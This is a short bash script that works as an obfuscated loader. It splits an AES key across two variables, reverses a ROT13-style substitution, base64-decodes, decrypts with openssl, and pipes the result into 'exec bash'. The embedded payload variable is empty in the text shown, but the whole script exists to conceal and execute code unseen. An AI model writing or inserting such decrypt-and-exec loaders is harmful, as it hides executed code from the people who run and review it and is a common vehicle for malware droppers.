c200a="3428107e8baed8c459529b67a33a2ac6"
c200b="e30343dcfe011073fa6f9610e9c9cef9"
c200="${c200a}${c200b}"

al='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
e200='OPQRSTUVWXYZABCDEFGHIJKLMNopqrstuvwxyzabcdefghijklmn'

p_outer=""

o(){ openssl enc -d -aes-256-cbc -salt -pbkdf2 -iter 100000 -k "$1" 2>/dev/null; }

exec bash <(printf %s "$p_outer" | tr "$e200" "$al" | base64 -d | o "$c200" | base64 -d)
